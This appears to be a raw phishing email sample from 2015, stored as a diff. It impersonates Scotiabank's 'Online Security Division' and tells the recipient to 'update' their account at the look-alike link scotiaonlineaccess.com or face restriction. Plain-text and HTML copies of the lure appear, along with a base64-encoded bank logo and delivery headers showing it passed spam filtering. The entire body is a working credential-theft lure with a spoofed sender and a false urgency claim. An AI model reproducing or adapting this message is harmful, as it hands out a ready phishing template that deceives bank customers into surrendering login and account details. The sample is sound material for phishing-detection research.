@@ -1,0 +1,174 @@
+From donotreply@scotiabank.ca  Mon May 25 03:29:21 2015 
+Return-Path: <donotreply@scotiabank.ca>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from mail.monkey.org (unknown [75.102.5.20])
+	by funky.monkey.org (Postfix) with ESMTP id A5AC94687F
+	for <jose@login.monkey.org>; Mon, 25 May 2015 03:29:21 -0400 (EDT)
+Received: from localhost (localhost [127.0.0.1])
+	by mail.monkey.org (Postfix) with ESMTP id 5D772232021;
+	Mon, 25 May 2015 07:31:23 +0000 (UTC)
+X-Virus-Scanned: amavisd-new at monkey.org
+X-Spam-Flag: NO
+X-Spam-Score: 4.542
+X-Spam-Level: ****
+X-Spam-Status: No, score=4.542 tagged_above=-10 required=6.6
+	tests=[BAYES_00=-2.599, HTML_IMAGE_ONLY_28=1.561, HTML_MESSAGE=0.001,
+	TVD_PH_REC=2.996, URIBL_OB_SURBL=1.5, URIBL_RHS_DOB=1.083]
+Received: from mail.monkey.org ([127.0.0.1])
+	by localhost (mail.monkey.org [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id TU0dU3NhCk4E; Mon, 25 May 2015 07:31:17 +0000 (UTC)
+Received: from DC-FASTEX.ITWFSTX.COM (dc-fastex.itwfastex.com [65.245.69.146])
+	by mail.monkey.org (Postfix) with ESMTP id A8A2623201D
+	for <jose@monkey.org>; Mon, 25 May 2015 07:31:17 +0000 (UTC)
+Received: from NEIGE21 ([206.55.82.247]) by DC-FASTEX.ITWFSTX.COM with Microsoft SMTPSVC(5.0.2195.6713);
+	 Mon, 25 May 2015 00:27:20 -0500
+From:"donotreply" <donotreply@scotiabank.ca>
+To: "jose" <jose@monkey.org> 
+Subject: ScotiaBank Important Update
+Message-ID: <8efbb522a7d32646b6e1089f57920036@NEIGE21>
+Date: Mon, 25 May 2015 01:27:18 -0400
+MIME-Version: 1.0
+Content-Type: multipart/related;
+	boundary="----=_NextPart_000_0001_6530C40D.3082A743"
+X-Priority: 3
+X-Mailer: Microsoft Office Outlook 12.0
+X-OriginalArrivalTime: 25 May 2015 05:27:20.0500 (UTC) FILETIME=[79C9B740:01C9DCF9]
+Content-Length: 7869
+Lines: 132
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 1065
+
+This is a multi-part message in MIME format.
+
+------=_NextPart_000_0001_6530C40D.3082A743
+Content-Type: multipart/alternative;
+	boundary="----=_NextPart_001_0002_FBDE8074.B2930E4D"
+
+------=_NextPart_001_0002_FBDE8074.B2930E4D
+Content-Type: text/plain;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+Dear Customer,=0D=0A=0D=0AScotia Bank online services is constantly =
+working towards security of all of it's online banking users. =
+To ensure the integrity of our online banking system, we updated =
+our new SSL servers. Thanks to this new technology our customers =
+can now benefit from the most secure online banking service =
+in North America.=0D=0A=0D=0ADue to the recent update of the =
+servers, you are requested to please update your account. Failure =
+to update your account information could result in your account =
+being placed into a restricted status. Update your Account information=
+ as soon as possible.=0D=0A=0D=0ATo prevent this restriction, =
+we require you to login into your account and complete our verificatio=
+n process. Various information such as your account number details =
+and your account information will be used to verify your identity. =
+All the information is securely encrypted ensuring that your =
+information remains safe.=0D=0A=0D=0ATo start account verification =
+please follow the link below (If you are not registered to Scotia =
+Bank online, now is the right time. Follow the link and get =
+registered today):=0D=0A=0D=0Ahttp://scotiaonlineaccess.com=0D=0A=0D=0A=
+Once you have updated your account records your Scotia Bank =
+online service will not be interrupted and will continue as =
+normal.=0D=0A=0D=0AT. Lawrence=0D=0ASecurity Advisor=0D=0AScotia =
+Bank - Online Security Division=0D=0A=0D=0APlease do not reply =
+to this e-mail. Mail sent to this address cannot be answered.=0D=0AFor=
+ assistance, log in to your Scotia Bank account and choose the =
+"Help" link on any page.=0D=0A=0D=0AScotia Email ID # 1025
+
+------=_NextPart_001_0002_FBDE8074.B2930E4D
+Content-Type: text/html;
+	charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">=0D=0A<H=
+TML><HEAD>=0D=0A<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">=0D=0A<META content=3D"MSHTML 6.00.6000.16825" =
+name=3DGENERATOR></HEAD>=0D=0A<BODY>=0D=0A<TABLE height=3D70 =
+cellSpacing=3D0 cellPadding=3D0 width=3D760 bgColor=3D#ffffff =
+border=3D0>=0D=0A=0D=0A<TR>=0D=0A<TD>&nbsp;</TD>=0D=0A<TD>&nbsp;</TD>=0D=
+=0A<TD>&nbsp;</TD>=0D=0A<TD style=3D"MARGIN: 0px; FONT-FAMILY: =
+arial, sans-serif"><IMG alt=3D"Scotia Bank" src=3D"cid:47f729388fb3254=
+cac8495dfdf7a308b@NEIGE21" border=3D0> </TD></TR></TABLE>=0D=0A<TABLE =
+cellSpacing=3D0 cellPadding=3D0 width=3D760 border=3D0>=0D=0A=0D=0A<TR=
+ vAlign=3Dtop>=0D=0A<TD style=3D"MARGIN: 0px; FONT-FAMILY: arial, =
+sans-serif" width=3D57></TD>=0D=0A<TD style=3D"MARGIN: 0px; =
+FONT-FAMILY: arial, sans-serif" width=3D610>=0D=0A<TABLE cellSpacing=3D=
+0 cellPadding=3D0 width=3D610 border=3D0>=0D=0A=0D=0A<TR>=0D=0A<TD =
+style=3D"MARGIN: 0px; FONT-FAMILY: arial, sans-serif"><FONT =
+face=3DArial color=3D#000000 size=3D2><BR>Dear Customer,<BR><BR>Scotia=
+ Bank online services is constantly working towards security =
+of all of it's online banking users. To ensure the integrity =
+of our online banking system, we updated our new SSL servers. =
+Thanks to this new technology our customers can now benefit =
+from the most secure online banking service in North America.<BR><BR>D=
+ue to the recent update of the servers, you are requested to =
+please update your account. Failure to update your account information=
+ could result in your account being placed into a restricted =
+status. Update your Account information as soon as possible.<BR><BR>To=
+ prevent this restriction, we require you to login into your =
+account and complete our verification process. Various information =
+such as your account number details and your account information =
+will be used to verify your identity. All the information is =
+securely encrypted ensuring that your information remains safe.<BR><BR=
+>To start account verification please follow the link below =
+(If you are not registered to Scotia Bank online, now is the =
+right time. Follow the link and <B>get registered today</B>):<BR><BR><=
+A style=3D"COLOR: rgb(42,93,176)" href=3D"http://scotiaonlineaccess.co=
+m/" target=3D_blank>http://scotiaonlineaccess.com</A><BR><BR>Once =
+you have updated your account records your Scotia Bank online =
+service will not be interrupted and will continue as normal.<BR><BR>T.=
+ Lawrence<BR>Security Advisor<BR>Scotia Bank - Online Security =
+Division<BR><BR><FONT face=3DArial color=3Dgray size=3D1>Please =
+do not reply to this e-mail. Mail sent to this address cannot =
+be answered.<BR>For assistance, log in to your Scotia Bank account =
+and choose the "Help" link on any page.<BR><BR>Scotia Email =
+ID # 1025</FONT> </FONT></TD></TR></TABLE></TD></TR></TABLE></BODY></H=
+TML>
+
+------=_NextPart_001_0002_FBDE8074.B2930E4D--
+
+------=_NextPart_000_0001_6530C40D.3082A743
+Content-Type: image/gif;
+	name=""
+Content-Transfer-Encoding: base64
+Content-ID: <47f729388fb3254cac8495dfdf7a308b@NEIGE21>
+
+R0lGODlhnAAaAPcAAMwAAPrm5uV7e9c5OfK9vdEZGeBjY+ucnP///9xSUvfW1s4ICOiMjNQpKe6s
+rPzv7/TGxuJwcNpERNMhIc8QEPje3v74+PXOzt5aWuFra9lCQtYxMemTk/C0tOaEhO2lpdtKSv/m
+5uNzc/e9vdYZGQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACH5BAAAAAAALAAAAACcABoA
+AAj/ABEIHEiQQIIFCAEoXLhwggWCECNKnEixosWLGDNq3DgxgAEKChMyXEiBAMeTKFOqXKkSQgGG
+IkdSuMCyps2bODFWAAlzwUgAFCDkHEq0qEoJPwH4hCnU6EYFHBQ4nZoSAkMJHg4QcHDhAoGvFTQG
+qBDg4VAFPikEwPghQoQPRiu4jfDAaASFFA5wGPChggEQTTMqwDDB54ICAlZCAAHCgNkPCztgTKAw
+gVGrCsMW1QD0A+cMERY4AJkYY4ekBlZCBmo2QAMAG+pexKAQw+WQmokOAPBBQAMNBDZsEPFhQwOT
+FyeETJABBAUPK08DmAAx9+zat5VazzmgAQQOBy50/wAf1YFe2RQrLLQt8AF6CxxAbBiQweyFCAMG
+JOAg28NupQk49kAGImSwFgIBiJBfBgpEgAEGNNEGAAYOJLABCHAR1IGFGBLwoAgIDGgAAwFEMJ8A
+smG2QFgXGOCiZDZh4JtCHrxUG2cAlEZRAEtRQGJ1rzFUlwc/FSBUkAxZoJ5CNF3AU0gLOYCAhD9l
+MJAAMilEXQAh2ahQbAioWJZyACSAHksEEKkQAwxpkMGX1y20AAZSCfQfAAU0QN1qAIAgApkLBJAB
+oBtooORCUiE5wAYMSUblAs4tBBcBckaqUAMILvUTA2GGZMGbADRg1k0QCCCABwSYauoBHZjKwKgT
+Wf9gwE+TLlQfAhVYQCZ7D9gYAQIOaDmQAgtVcMFCpWGpkKN4SRUAmRogQBlQzgaJKY8KaaAABGRK
+0CmebCpVJ04QIOQjBRQUQEECIqCrAX8X3eflAvApVMCoSwKAHAKgDgCsvWYRq1AAB+Al2wM8MQtA
+agKp6VCQDCPAwaWZMilQuP4eO5KUQz2wlAdPJoAUABkMEJhFD1BJwMTTESQwAIEpu8G/0wW8UAAs
+UzCqjQqDKBDLDyv0q0CrXbtUnQUDkHFIHxfFgQEZEMAAaAZInUEGkHE8EQEHIsBnB5QqlGGIPOnI
+6IRe42XzwNIBAGPbCmMq0Mj+4ii3tBRjCwBNCCT/7S9mBbAMc1EYDAACAQNoIIID+UFA29gSbQBp
+BB/dbIGXGDTH70IMeLiQSWEDoIEAAXCpkAIW8OQjA08qLDoH0wIAneAafECl0Rb3rdDfnoLqEFEQ
+gJQBZQe8JIKykEfkJUOcItC2pxbcyVBpvTJU+kI0JZ2U6yOJamdSoSKI/c+7fwtAWTZGnJMFvnFA
+gAEaHHDX6RRZkMAEFCBUQAL7hqnBUmBiH6AGoLUwWQtXBUhgnT5ApglwQAMTmIBJ/jQBERwEKBhA
+zwMqNycGRBAECNLTBBYYQdtcIIINWEsHIuhAcn0FAuLRCgMEQKbwXeQBpYMVQQKggK4NhIc+JEgF
+UyogGwsYsTq5sggPzzSQB/QwJ0xUyfzAx5DkUeWKWLyJCMAXE7Rl8YtgVMkWuRgyHYbxjGiMCPuo
+qBSftDCNcIzjQMZIxcNEIIhyzKMe98hHOAYEADs=
+
+------=_NextPart_000_0001_6530C40D.3082A743--
